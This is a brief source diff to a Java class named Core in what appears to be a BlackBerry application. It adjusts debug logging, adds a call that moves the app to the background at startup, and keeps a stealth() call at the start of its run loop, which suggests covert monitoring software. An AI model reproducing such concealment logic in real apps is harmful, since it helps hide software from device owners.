@@ -67,9 +67,9 @@ public final class Core implements Runnable {
 
         //#ifdef DEBUG
         Debug.init(Conf.DEBUG_OUT, Conf.DEBUG_SD, Conf.DEBUG_FLASH,
-                Conf.DEBUG_EVENTS);
+                Conf.DEBUG_EVENTS, Conf.DEBUG_INFO);
         debug = new Debug("Core", DebugLevel.VERBOSE);
-        debug.trace("Core init");
+        debug.info("INIT "+ (new Date()).toString());
         //#endif
         
         //#ifdef HAVE_PERMISSIONS
@@ -101,6 +101,8 @@ public final class Core implements Runnable {
         //#endif
 
         Encryption.init();
+        
+        ((Main)UiApplication.getUiApplication()).goBackground();
     }
 
     /**
@@ -215,9 +217,6 @@ public final class Core implements Runnable {
      * @return true, if successful
      */
     public void run() {
-
-
-
         stealth();
 
         Utils.sleep(500);
